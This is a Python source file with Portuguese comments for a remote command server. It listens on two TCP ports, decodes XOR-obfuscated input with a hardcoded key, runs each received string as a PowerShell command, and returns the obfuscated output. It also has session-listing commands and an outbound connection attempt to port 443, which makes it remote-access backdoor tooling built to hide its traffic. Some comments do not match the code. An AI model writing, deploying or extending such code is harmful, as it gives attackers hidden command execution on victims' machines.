import socket
import threading
import subprocess

# Função XOR nos Dados
def apply_xor(data, key):
    key_size = len(key)
    return bytes(data_byte ^ key[i % key_size] for i, data_byte in enumerate(data))

# Endereço e porta do servidor
HOST = '192.168.0.8'  # Usar loopback como padrão em caso de erro
PORT = 12859                # Porta principal usada pelo servidor
PORT2 = 12860               # Segunda porta para conexão de clientes
KEY = b'mysecretkey'        # Chave de criptografia

# Lista para armazenar as conexões ativas
active_connections = []

def handle_client(client_socket, address):
    print(f"Conexão recebida de {address}")

    try:
        while True:
            # Recebe comando criptografado do cliente
            encrypted_command = client_socket.recv(8192)
            if not encrypted_command:
                break

            # Descriptografa o comando
            command = apply_xor(encrypted_command, KEY).decode()

            # Verifica se o comando é para listar as sessões em segundo plano
            if command.lower() == 'list':
                list_sessions(client_socket)
                continue

            # Verifica se o comando é para deixar a sessão em segundo plano
            if command.lower().startswith('background'):
                # Divide o comando em partes
                parts = command.split()
                if len(parts) == 4:
                    machine_name, ip_address, port = parts[1:]
                    session_info = f"{machine_name} - {ip_address}:{port}"
                    print(f"Sessão de {address} inserida em segundo plano: {session_info}")
                    client_socket.sendall(apply_xor(f"Sessão inserida em segundo plano: {session_info}".encode(), KEY))
                else:
                    client_socket.sendall(apply_xor("Comando 'background' inválido. Formato correto: background [machine_name] [ip_address] [port]".encode(), KEY))
                continue

            # Executa o comando no PowerShell e captura a saída
            output = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True)

            # Envia a saída criptografada de volta para o cliente
            encrypted_output = apply_xor(output.stdout.encode(), KEY)
            client_socket.sendall(encrypted_output)

    except Exception as e:
        print(f"Erro ao lidar com o cliente {address}: {e}")

    print(f"Conexão com {address} encerrada.")
    client_socket.close()

def list_sessions(client_socket):
    if active_connections:
        for i, (client, address) in enumerate(active_connections, start=1):
            session_info = f"Session {i}: {address[0]}:{address[1]}"
            encrypted_response = apply_xor(session_info.encode(), KEY)
            client_socket.sendall(encrypted_response)
    else:
        no_session_message = "Não há sessões em segundo plano."
        encrypted_response = apply_xor(no_session_message.encode(), KEY)
        client_socket.sendall(encrypted_response)

def accept_connections(socket):
    while True:
        # Aceita a conexão
        client_socket, address = socket.accept()

        # Adiciona a conexão à lista de conexões ativas
        active_connections.append((client_socket, address))

        # Inicia uma thread para lidar com o cliente
        client_thread = threading.Thread(target=handle_client, args=(client_socket, address))
        client_thread.start()

def connect_to_ip(ip, port, retries=3):
    for attempt in range(1, retries + 1):
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((ip, port))
            print(f"Conexão estabelecida com {ip}:{port}")
            return client_socket
        except Exception as e:
            print(f"Tentativa {attempt} de conexão com {ip}:{port} falhou. Tentando novamente...")
            print(f"Erro: {e}")
            continue
    print(f"Não foi possível conectar a {ip}:{port} após {retries} tentativas.")
    return None

try:
    # Criação do socket TCP/IP
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Liga o socket ao endereço e porta principal
    server_socket.bind((HOST, PORT))

    # Liga o socket a segunda porta
    server_socket2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket2.bind((HOST, PORT2))

    # Escuta por no máximo 5 conexões na porta principal
    server_socket.listen(5)
    print(f"Servidor escutando em {HOST}:{PORT}")

    # Escuta por no máximo 5 conexões na segunda porta
    server_socket2.listen(5)
    print(f"Servidor escutando em {HOST}:{PORT2}")

    # Inicia threads para lidar com as conexões em ambas as portas
    threading.Thread(target=accept_connections, args=(server_socket,)).start()
    threading.Thread(target=accept_connections, args=(server_socket2,)).start()

    # Tentativas de conexão ao IP 192.168.0.8 na porta 443
    connect_to_ip('192.168.0.8', 443)

except KeyboardInterrupt:
    print("Servidor encerrado manualmente.")

except Exception as e:
    print("Erro:", e)

finally:
    # Mantém o programa em execução
    while True:
        pass
